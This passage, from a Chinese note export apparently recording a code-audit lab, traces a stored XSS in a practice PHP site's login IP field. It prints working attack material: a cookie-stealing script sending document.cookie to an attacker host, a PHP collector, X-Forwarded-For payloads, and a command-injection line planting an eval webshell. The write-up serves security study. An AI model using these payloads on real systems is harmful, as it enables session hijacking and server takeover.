内容转化为HTML实体"}]},{"ID":"20240927111507-tnj0dtq","Type":"NodeParagraph","Properties":{"id":"20240927111507-tnj0dtq","updated":"20240927111507"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240927111507-332hdht.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240927111507-s2dcsmt","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927111507-s2dcsmt"},"Children":[{"ID":"20240927111507-jpm1q6c","Type":"NodeParagraph","Properties":{"id":"20240927111507-jpm1q6c","updated":"20240927111544"},"Children":[{"Type":"NodeText","Data":"严格限制输入（正则匹配、自定义函数、clean_input函数等）"}]},{"ID":"20240927111522-66dnd69","Type":"NodeParagraph","Properties":{"id":"20240927111522-66dnd69","updated":"20240927111522"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240927111522-27rx43c.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]},{"ID":"20240927111603-hwut0e4","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240927111603-hwut0e4","updated":"20240927111833"},"Children":[{"Type":"NodeText","Data":"栗子🌰-靶场codeaudit"}]},{"ID":"20240927112146-ira2x0v","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927112146-ira2x0v","updated":"20240927112306"},"Children":[{"Type":"NodeText","Data":"审计代码"}]},{"ID":"20240927111751-6ggpd9m","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240927111751-6ggpd9m","updated":"20240927111902"},"Children":[{"Type":"NodeText","Data":"使用Seay审计工具-重定向到manageUser.php文件"}]},{"ID":"20240927111732-kabp2g2","Type":"NodeParagraph","Properties":{"id":"20240927111732-kabp2g2","updated":"20240927111732"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926190158584"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926190158584.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927111732-5iul6eg","Type":"NodeParagraph","Properties":{"id":"20240927111732-5iul6eg","updated":"20240927111732"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926190605228"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926190605228.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927111732-hbt7ziv","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240927111732-hbt7ziv","updated":"20240927111732"},"Children":[{"Type":"NodeText","Data":"跟进login_ip的出处"}]},{"ID":"20240927111732-qhz8g2r","Type":"NodeParagraph","Properties":{"id":"20240927111732-qhz8g2r","updated":"20240927111732"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926190751017"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926190751017.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927111732-b4jkgsy","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240927111732-b4jkgsy","updated":"20240927111732"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"进入/user/logCheck.php文件"}]},{"ID":"20240927111732-zry44jq","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-zry44jq","updated":"20240927111947"},"Children":[{"ID":"20240927111932-qaosuug","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927111932-qaosuug","updated":"20240927111947"},"Children":[{"ID":"20240927111932-yy55lt5","Type":"NodeParagraph","Properties":{"id":"20240927111932-yy55lt5","updated":"20240927111932"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"代码分析"}]},{"ID":"20240927111945-08js884","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927111945-08js884","updated":"20240927111947"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\ninclude_once('../sys/config.php');   //文件包含\n\n//检查提交的数据，首先数据不能为空\nif (isset($_POST['submit']) \u0026\u0026 !empty($_POST['user']) \u0026\u0026 !empty($_POST['pass'])) {\n\n//清理和过滤用户输入，防止sql注入等攻击\n    $clean_name = clean_input($_POST['user']);\n    $clean_pass = clean_input($_POST['pass']);\n  \n//SQL查询检查数据库是否存在匹配的用户名和密码（密码使用了SHA函数加密）\n    $query = \"SELECT * FROM users WHERE user_name = '$clean_name' AND user_pass = SHA('$clean_pass')\";\n    $data = mysql_query($query, $conn) or die('Error!!');\n\n//表示查找到一个用户后，对其进行相关设置\n    if (mysql_num_rows($data) == 1) {\n        $row = mysql_fetch_array($data);\n      \n//会话设置\n        $_SESSION['username'] = $row['user_name'];\n        $_SESSION['avatar'] = $row['user_avatar'];\n  \n//更新用户登录IP，使用了两个过滤函数：sqlwaf函数和get_client_ip函数获取相关数据（自定义）\n        $ip = sqlwaf(get_client_ip());\n  \n//这里login_ip写入到user表的用户信息存储在数据库中，考虑这里可能存在存储xss漏洞\n        $query = \"UPDATE users SET login_ip = '$ip' WHERE user_id = '$row[user_id]'\";\n        mysql_query($query, $conn) or die(\"updata error!\");\n        header('Location: user.php');\n        }\n    else {\n        $_SESSION['error_info'] = '用户名或密码错误';\n        header('Location: login.php');\n    }\n    mysql_close($conn);\n}\nelse {\n    not_find($_SERVER['PHP_SELF']);\n}\n?\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]}]},{"ID":"20240927111732-oik63iv","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240927111732-oik63iv","updated":"20240927111732"},"Children":[{"Type":"NodeText","Data":"根据以上两个函数去跟进，全文追中定位到/sys/lib.php"}]},{"ID":"20240927111732-3310rmg","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-3310rmg","updated":"20240927112023"},"Children":[{"ID":"20240927112006-5fcvrec","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112006-5fcvrec","updated":"20240927112006"},"Children":[{"ID":"20240927112006-0x5rhlr","Type":"NodeParagraph","Properties":{"id":"20240927112006-0x5rhlr","updated":"20240927112006"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"sqlwaf是过滤SQL语句的，这里可以留个眼子"}]},{"ID":"20240927112009-d0ub63p","Type":"NodeParagraph","Properties":{"id":"20240927112009-d0ub63p","updated":"20240927112010"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926192156026"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926192156026.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240927112018-auiuo0f","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112018-auiuo0f","updated":"20240927112023"},"Children":[{"ID":"20240927112018-6hhm2m2","Type":"NodeParagraph","Properties":{"id":"20240927112018-6hhm2m2","updated":"20240927112019"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"get_client_ip是用来获取的IP来源，判断请求头中是否包含client ip或者x-forwarded for请求头和remote-addr;满足其中任一条件，则将获取的值赋予给函数并返回"}]},{"ID":"20240927112023-w3ork5p","Type":"NodeParagraph","Properties":{"id":"20240927112023-w3ork5p","updated":"20240927112023"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926192340818"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926192340818.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]}]}]},{"ID":"20240927112032-5emhfrx","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240927112032-5emhfrx","updated":"20240927112032"},"Children":[{"Type":"NodeText","Data":"查看那些代码有引用这个文件，发现登录页面被引用"}]},{"ID":"20240927111732-2tlq0s2","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-2tlq0s2","updated":"20240927112128"},"Children":[{"ID":"20240927112112-qcbkm0w","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112112-qcbkm0w","updated":"20240927112112"},"Children":[{"ID":"20240927112112-6q6o615","Type":"NodeParagraph","Properties":{"id":"20240927112112-6q6o615","updated":"20240927112113"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"用户和管理员页面都有引用"}]},{"ID":"20240927112116-2ld6aef","Type":"NodeParagraph","Properties":{"id":"20240927112116-2ld6aef","updated":"20240927112118"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926192519830"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926192519830.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240927112127-8jn266i","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112127-8jn266i","updated":"20240927112128"},"Children":[{"ID":"20240927112127-c06k2f4","Type":"NodeParagraph","Properties":{"id":"20240927112127-c06k2f4","updated":"20240927112128"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"所以在普通用户登录时在获取login_ip时，在管理员登录访问/admin/manageUser.php触发xss漏洞"}]}]}]},{"ID":"20240927111732-k5m9x78","Type":"NodeParagraph","Properties":{"id":"20240927111732-k5m9x78","updated":"20240927112138"}},{"ID":"20240927111732-tsupsg5","Type":"NodeParagraph","Properties":{"id":"20240927111732-tsupsg5","updated":"20240927112115"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927111732-h20fjjt","Type":"NodeParagraph","Properties":{"id":"20240927111732-h20fjjt","updated":"20240927112122"}},{"ID":"20240927111732-48eja92","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927111732-48eja92","updated":"20240927111732"},"Children":[{"Type":"NodeText","Data":"使用存储型XSS获取管理员cookie到第三方服务器中，利用cookie登录管理员账号，获取shell (ping.php)"}]},{"ID":"20240927111732-k4wmjqf","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-k4wmjqf","updated":"20240927112512"},"Children":[{"ID":"20240927112329-3dbqpe2","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112329-3dbqpe2","updated":"20240927112512"},"Children":[{"ID":"20240927112329-br7lj3x","Type":"NodeParagraph","Properties":{"id":"20240927112329-br7lj3x","updated":"20240927112512"},"Children":[{"Type":"NodeText","Data":"先进行用户注册test:test"}]}]}]},{"ID":"20240927111732-ydj8vmm","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-ydj8vmm","updated":"20240927112514"},"Children":[{"ID":"20240927112333-2erzr4i","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112333-2erzr4i","updated":"20240927112514"},"Children":[{"ID":"20240927112333-1vemef7","Type":"NodeParagraph","Properties":{"id":"20240927112333-1vemef7","updated":"20240927112514"},"Children":[{"Type":"NodeText","Data":"先证实是否存在"}]}]}]},{"ID":"20240927111732-ewxxwss","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-ewxxwss","updated":"20240927112520"},"Children":[{"ID":"20240927112341-vpuwutk","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112341-vpuwutk","updated":"20240927112517"},"Children":[{"ID":"20240927112341-rj4zfle","Type":"NodeParagraph","Properties":{"id":"20240927112341-rj4zfle","updated":"20240927112517"},"Children":[{"Type":"NodeText","Data":"抓包添加"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"X-Forwarded-For:\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;"},{"Type":"NodeText","Data":"​或"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"client-ip:`\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;`"},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927112412-3d16q40","Type":"NodeParagraph","Properties":{"id":"20240927112412-3d16q40","updated":"20240927112413"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926195927201"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926195927201.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240927112418-99y8cho","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112418-99y8cho","updated":"20240927112520"},"Children":[{"ID":"20240927112418-7ce583r","Type":"NodeParagraph","Properties":{"id":"20240927112418-7ce583r","updated":"20240927112520"},"Children":[{"Type":"NodeText","Data":"管理员登进去访问是存在xss漏洞的，重新进去仍然弹窗，说明是存储型xss"}]},{"ID":"20240927112424-cykshu8","Type":"NodeParagraph","Properties":{"id":"20240927112424-cykshu8","updated":"20240927112426"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926200101000"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926200101000.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]},{"ID":"20240927111732-zjmzge4","Type":"NodeParagraph","Properties":{"id":"20240927111732-zjmzge4","updated":"20240927112456"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"！！！"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color8);"},"TextMarkType":"text","TextMarkTextContent":"现实中，是不能拿弹窗直接写这个进去的，别人拿的源码来检测的话就没啥问题"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color8);\"}"},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"！！！"},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927111732-i6qw18i","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-i6qw18i","updated":"20240927112954"},"Children":[{"ID":"20240927112448-uhcq2gf","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112448-uhcq2gf","updated":"20240927112448"},"Children":[{"ID":"20240927112448-xg7gnsy","Type":"NodeParagraph","Properties":{"id":"20240927112448-xg7gnsy","updated":"20240927112523"},"Children":[{"Type":"NodeText","Data":"首先准备好两个文件并且开启web服务"}]},{"ID":"20240927112530-2rln6kg","Type":"NodeList","ListData":{},"Properties":{"id":"20240927112530-2rln6kg"},"Children":[{"ID":"20240927112529-yxae6jw","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"1","id":"20240927112529-yxae6jw"},"Children":[{"ID":"20240927112529-uvi8mo3","Type":"NodeParagraph","Properties":{"id":"20240927112529-uvi8mo3","updated":"20240927112534"},"Children":[{"Type":"NodeText","Data":"cookie.js文件"}]},{"ID":"20240927112541-wlz3f0m","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927112541-wlz3f0m","updated":"20240927112543"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"var img = document.createElement('img'); //在对象中创建一个对象，主流浏览器都支持createElement()方法\nimg.width = 0;\nimg.height = 0;\nimg.src = 'http://192.168.43.227/zy.php?cookie=' + encodeURIComponent(document.cookie); //document.cookie--获取cookie信息\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20240927112609-20v234h","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"1","id":"20240927112609-20v234h"},"Children":[{"ID":"20240927112609-wq98a98","Type":"NodeParagraph","Properties":{"id":"20240927112609-wq98a98","updated":"20240927112632"},"Children":[{"Type":"NodeText","Data":"zy.php文件"}]},{"ID":"20240927112613-lafq9b2","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927112613-lafq9b2","updated":"20240927112627"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"\u003c?php \n$cookie=$_GET['cookie'];              //接收cookie的值\n$str=fopen('cookie.txt','a');       //打开资源句柄\nfwrite($str,$cookie.PHP_EOL);              //将cookie值写入文件\nfclose($str);                      //关闭资源句柄\n?\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]}]}]},{"ID":"20240927112637-uz02hr5","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112637-uz02hr5","updated":"20240927112658"},"Children":[{"ID":"20240927112637-ja7m92w","Type":"NodeParagraph","Properties":{"id":"20240927112637-ja7m92w","updated":"20240927112658"},"Children":[{"Type":"NodeText","Data":"登录时进行抓包插入（任意一个）"}]},{"ID":"20240927112650-ajyymke","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927112650-ajyymke","updated":"20240927112653"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"X-Forwarded-For:\u003cscript src=http://192.168.43.227/cookie.js\u003e\u003c/script\u003e\nX-Forwarded-For:\u003csvg src=http://192.168.43.227/cookie.js\u003e\u003c/svg\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240927112717-n9gjb7g","Type":"NodeParagraph","Properties":{"id":"20240927112717-n9gjb7g","updated":"20240927112722"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926231328622"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926231328622.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240927112736-fqtdnp2","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112736-fqtdnp2"},"Children":[{"ID":"20240927112736-8n7wbnf","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927112736-8n7wbnf","updated":"20240927112739"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"POST /user/logCheck.php HTTP/1.1\nHost: codeaudit\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\nOrigin: http://codeaudit\nConnection: close\nReferer: http://codeaudit/user/login.php\nCookie: PHPSESSID=t1qg3ur4m9qknl2riut2eiihb3\nX-Forwarded-For:\u003csvg src=http://192.168.43.227/cookie.js\u003e\u003c/svg\u003e\nUpgrade-Insecure-Requests: 1\n\nuser=test\u0026pass=test\u0026submit=%E7%99%BB%E5%BD%95\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20240927112734-5tcdnse","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112734-5tcdnse"},"Children":[{"ID":"20240927112734-2l8rso7","Type":"NodeParagraph","Properties":{"id":"20240927112734-2l8rso7","updated":"20240927112749"},"Children":[{"Type":"NodeText","Data":"管理员登录去访问用户"}]},{"ID":"20240927112757-waegnzc","Type":"NodeParagraph","Properties":{"id":"20240927112757-waegnzc","updated":"20240927112759"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926195152921"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926195152921.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240927112759-rrugcg9","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112759-rrugcg9"},"Children":[{"ID":"20240927112759-eky9l6x","Type":"NodeParagraph","Properties":{"id":"20240927112759-eky9l6x","updated":"20240927112805"},"Children":[{"Type":"NodeText","Data":"用户这边就能获取到管理员的cookie--发现有cookie.txt文件"}]},{"ID":"20240927112810-lvts7i0","Type":"NodeParagraph","Properties":{"id":"20240927112810-lvts7i0","updated":"20240927112812"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926221111175"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926221111175.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240927112826-semm8z2","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112826-semm8z2"},"Children":[{"ID":"20240927112826-ir0nudp","Type":"NodeParagraph","Properties":{"id":"20240927112826-ir0nudp","updated":"20240927112831"},"Children":[{"Type":"NodeText","Data":"获取cookie之后用，随机页面抓包修改访问路径/admin/ping.php，更改cookie，就能跳登录进入该页面"}]},{"ID":"20240927112836-87fcf9z","Type":"NodeParagraph","Properties":{"id":"20240927112836-87fcf9z","updated":"20240927112837"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926231138058"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926231138058.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240927112904-wib9de7","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112904-wib9de7"},"Children":[{"ID":"20240927112904-qnw9a0m","Type":"NodeParagraph","Properties":{"id":"20240927112904-qnw9a0m"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927112905-uhchpxe","Type":"NodeParagraph","Properties":{"id":"20240927112905-uhchpxe","updated":"20240927112905"},"Children":[{"Type":"NodeText","Data":"重做的第二个，所以session不一样，要两个浏览器使用，cookie才会不同"}]},{"ID":"20240927112905-2ayaifc","Type":"NodeParagraph","Properties":{"id":"20240927112905-2ayaifc","updated":"20240927112905"},"Children":[{"Type":"NodeText","Data":"**ping **"},{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"www.baidu.com","TextMarkTextContent":"www.baidu.com"},{"Type":"NodeText","Data":" 是成功的（因为没清空网站cookie，所以抓包来查看）"}]},{"ID":"20240927112913-abbsh0i","Type":"NodeParagraph","Properties":{"id":"20240927112913-abbsh0i","updated":"20240927112915"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240927015042230"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240927015042230.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240927112920-h96l94c","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927112920-h96l94c","updated":"20240927112954"},"Children":[{"ID":"20240927112920-0wan5fi","Type":"NodeParagraph","Properties":{"id":"20240927112920-0wan5fi","updated":"20240927112921"},"Children":[{"Type":"NodeText","Data":"这里插入一句话木马"}]},{"ID":"20240927112931-c4zmgv0","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927112931-c4zmgv0","updated":"20240927112933"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"zy || echo ?php @eval($_POST[cmd]);? \u003e ../zy.php\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240927112954-svm4dga","Type":"NodeParagraph","Properties":{"id":"20240927112954-svm4dga","updated":"20240927112954"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240927020539299"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240927020539299.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927112954-eln02oy","Type":"NodeParagraph","Properties":{"id":"20240927112954-eln02oy","updated":"20240927112954"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240927015656868"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240927015656868.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927112954-n50dyd4","Type":"NodeParagraph","Properties":{"id":"20240927112954-n50dyd4","updated":"20240927112954"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240927021617884"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240927021617884.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]},{"ID":"20240927111732-1apnpz5","T